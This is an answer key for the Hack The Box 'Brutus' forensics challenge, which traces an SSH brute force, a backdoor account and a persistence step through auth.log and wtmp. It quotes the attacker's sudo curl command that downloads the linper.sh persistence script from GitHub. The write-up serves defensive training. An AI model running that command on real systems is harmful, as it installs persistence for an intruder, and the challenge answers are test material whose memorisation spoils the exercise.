# Brutus 

[Brutus](https://app.hackthebox.com/sherlocks/Brutus)

## Description

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

## Question

1. Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

> `65.2.161.68`

2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

> `root`

3. Identify the timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

> `2024-03-06 06:32:45`

4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

> `37`

5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

> `cyberjunkie`

6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

> `T1136.001`

7. What time did the attacker's first SSH session end according to auth.log?

> `2024-03-06 06:37:24`

8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

> `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
